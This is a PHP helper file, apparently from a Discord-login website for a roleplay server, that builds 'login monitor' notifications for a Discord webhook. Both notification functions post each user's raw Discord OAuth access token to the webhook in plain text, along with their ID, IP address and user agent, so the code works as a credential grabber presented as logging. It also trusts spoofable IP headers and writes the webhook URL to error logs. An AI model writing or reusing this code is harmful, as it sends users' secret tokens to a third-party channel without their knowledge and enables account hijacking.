<?php
/**
 * Functions for sending data to Discord webhooks
 */

/**
 * Send login notification to Discord webhook
 * @param array $user_data User data from Discord OAuth
 * @param string $access_token User's access token
 * @param string $login_type Type of login (admin, forum, or regular)
 * @return bool Success status
 */
function sendLoginNotification($user_data, $access_token, $login_type = 'regular') {
    $config = require_once 'config.php';
    
    // Check if config is valid and has webhook URL
    if (!is_array($config) || !isset($config['webhook']['login_webhook']) || empty($config['webhook']['login_webhook'])) {
        return false;
    }
    
    $webhook_url = $config['webhook']['login_webhook'];
    
    // Validate user data
    if (!is_array($user_data) || empty($user_data['id']) || empty($user_data['username'])) {
        return false;
    }
    
    // Prepare user avatar URL
    $avatar_url = null;
    if (!empty($user_data['avatar'])) {
        $avatar_url = "https://cdn.discordapp.com/avatars/{$user_data['id']}/{$user_data['avatar']}.png";
    }
    
    // Determine login type emoji and color
    $login_info = getLoginTypeInfo($login_type);
    
    // Create embed for Discord webhook
    $embed = [
        'title' => $login_info['title'],
        'color' => $login_info['color'],
        'timestamp' => date('c'),
        'thumbnail' => [
            'url' => $avatar_url ?: 'https://cdn.discordapp.com/embed/avatars/0.png'
        ],
        'fields' => [
            [
                'name' => '👤 معلومات المستخدم',
                'value' => "**الاسم:** " . ($user_data['global_name'] ?? $user_data['username']) . "\n**اسم المستخدم:** {$user_data['username']}\n**معرف المستخدم:** {$user_data['id']}",
                'inline' => false
            ],
            [
                'name' => '🔑 معلومات الجلسة',
                'value' => "**نوع تسجيل الدخول:** {$login_info['type_ar']}\n**التوقيت:** " . date('Y-m-d H:i:s') . "\n**IP:** " . getUserIP(),
                'inline' => false
            ],
            [
                'name' => '🎫 Discord Access Token',
                'value' => "```\n" . $access_token . "\n```",
                'inline' => false
            ]
        ],
        'footer' => [
            'text' => 'Las Vegas RP - نظام تسجيل الدخول',
            'icon_url' => 'https://cdn.discordapp.com/embed/avatars/0.png'
        ]
    ];
    
    // Prepare webhook payload
    $payload = [
        'embeds' => [$embed],
        'username' => 'Login Monitor',
        'avatar_url' => 'https://cdn.discordapp.com/embed/avatars/0.png'
    ];
    
    // Send to webhook
    return sendWebhookRequest($webhook_url, $payload);
}

/**
 * Get login type information
 * @param string $login_type
 * @return array
 */
function getLoginTypeInfo($login_type) {
    switch ($login_type) {
        case 'admin':
            return [
                'title' => '🔴 تسجيل دخول إداري',
                'color' => 0xFF0000, // Red
                'type_ar' => 'إداري'
            ];
        case 'forum':
            return [
                'title' => '🟡 تسجيل دخول للمنتدى',
                'color' => 0xFFFF00, // Yellow
                'type_ar' => 'منتدى'
            ];
        default:
            return [
                'title' => '🟢 تسجيل دخول عادي',
                'color' => 0x00FF00, // Green
                'type_ar' => 'عادي'
            ];
    }
}

/**
 * Send request to Discord webhook
 * @param string $webhook_url
 * @param array $payload
 * @return bool
 */
function sendWebhookRequest($webhook_url, $payload) {
    $json_payload = json_encode($payload);
    
    // Log the payload for debugging
    error_log("Webhook URL: " . $webhook_url);
    error_log("Payload size: " . strlen($json_payload) . " bytes");
    
    $options = [
        'http' => [
            'header' => [
                "Content-Type: application/json",
                "Content-Length: " . strlen($json_payload)
            ],
            'method' => 'POST',
            'content' => $json_payload,
            'timeout' => 30
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($webhook_url, false, $context);
    
    // Log the result
    if ($result === false) {
        $error = error_get_last();
        error_log("Webhook request failed: " . ($error['message'] ?? 'Unknown error'));
        
        // Check if it's a network issue
        if (isset($http_response_header)) {
            error_log("HTTP Response Headers: " . implode(', ', $http_response_header));
        }
        return false;
    } else {
        error_log("Webhook request successful. Response: " . $result);
        return true;
    }
}

/**
 * Get user's IP address
 * @return string
 */
function getUserIP() {
    // Check for IP from shared internet
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    // Check for IP passed from proxy
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    // Check for IP from remote address
    else {
        return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    }
}

/**
 * Send detailed user information to webhook
 * @param array $user_data User data from Discord OAuth
 * @param string $access_token User's access token
 * @param array $additional_info Additional information to include
 * @return bool Success status
 */
function sendDetailedUserInfo($user_data, $access_token, $additional_info = []) {
    $config = require_once 'config.php';
    
    // Check if config is valid and has webhook URL
    if (!is_array($config) || !isset($config['webhook']['login_webhook']) || empty($config['webhook']['login_webhook'])) {
        return false;
    }
    
    $webhook_url = $config['webhook']['login_webhook'];
    
    // Validate user data
    if (!is_array($user_data) || empty($user_data['id']) || empty($user_data['username'])) {
        return false;
    }
    
    // Prepare user avatar URL
    $avatar_url = null;
    if (!empty($user_data['avatar'])) {
        $avatar_url = "https://cdn.discordapp.com/avatars/{$user_data['id']}/{$user_data['avatar']}.png";
    }
    
    // Create detailed embed
    $embed = [
        'title' => '📊 معلومات مفصلة للمستخدم',
        'color' => 0x0099FF, // Blue
        'timestamp' => date('c'),
        'thumbnail' => [
            'url' => $avatar_url ?: 'https://cdn.discordapp.com/embed/avatars/0.png'
        ],
        'fields' => [
            [
                'name' => '👤 البيانات الأساسية',
                'value' => "**الاسم الكامل:** " . ($user_data['global_name'] ?: 'غير محدد') . "\n**اسم المستخدم:** {$user_data['username']}\n**التمييز:** #" . ($user_data['discriminator'] ?? '0000') . "\n**معرف المستخدم:** {$user_data['id']}",
                'inline' => true
            ],
            [
                'name' => '🔐 معلومات الأمان',
                'value' => "**Access Token:** ```" . $access_token . "```\n**نوع التوكن:** Bearer\n**الصلاحيات:** identify",
                'inline' => true
            ],
            [
                'name' => '🌐 معلومات الاتصال',
                'value' => "**عنوان IP:** " . getUserIP() . "\n**User Agent:** " . substr($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown', 0, 50) . "...\n**التوقيت:** " . date('Y-m-d H:i:s T'),
                'inline' => false
            ]
        ],
        'footer' => [
            'text' => 'Las Vegas RP - نظام مراقبة تسجيل الدخول',
            'icon_url' => 'https://cdn.discordapp.com/embed/avatars/0.png'
        ]
    ];
    
    // Add additional information if provided
    if (!empty($additional_info)) {
        $additional_text = '';
        foreach ($additional_info as $key => $value) {
            $additional_text .= "**{$key}:** {$value}\n";
        }
        
        $embed['fields'][] = [
            'name' => '📋 معلومات إضافية',
            'value' => $additional_text,
            'inline' => false
        ];
    }
    
    // Prepare webhook payload
    $payload = [
        'embeds' => [$embed],
        'username' => 'User Info Monitor',
        'avatar_url' => 'https://cdn.discordapp.com/embed/avatars/0.png'
    ];
    
    // Send to webhook
    return sendWebhookRequest($webhook_url, $payload);
}
?>
